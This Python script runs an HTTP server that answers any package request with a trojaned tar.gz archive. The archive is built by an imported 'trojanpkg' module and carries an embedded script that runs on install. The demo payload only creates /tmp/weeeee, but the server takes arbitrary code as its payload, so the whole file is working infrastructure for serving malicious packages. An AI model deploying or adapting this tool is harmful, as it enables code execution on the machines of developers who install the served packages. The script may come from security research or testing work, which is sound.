#!/usr/bin/env python3
from http.server import HTTPServer
from http.server import BaseHTTPRequestHandler
from urllib import parse

import trojanpkg

class GetHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        parsed_path = parse.urlparse(self.path)
        path = parsed_path.path
        package_name = path[1:].split(".")[0]
        print(path, package_name)
        tar = trojanpkg.build_pkg(name=package_name, script=self._script)

        self.send_response(200)
        self.send_header('Content-Type', 'application/tar+gzip')
        self.end_headers()
        self.wfile.write(tar)

def run_trojan_server(script, port=8080, max_requests=1):
    #FIXME: overwrites global instance
    GetHandler._script = script
    
    server = HTTPServer(('0.0.0.0', port), GetHandler)
    print('Starting server on port {}, use <Ctrl-C> to stop'.format(port))
    for i in range(max_requests):
        print("Serving request {} of {}...".format(i+1, max_requests))
        server.handle_request()

if __name__ == "__main__":
    run_trojan_server("""import os
os.system("touch /tmp/weeeee")
""")
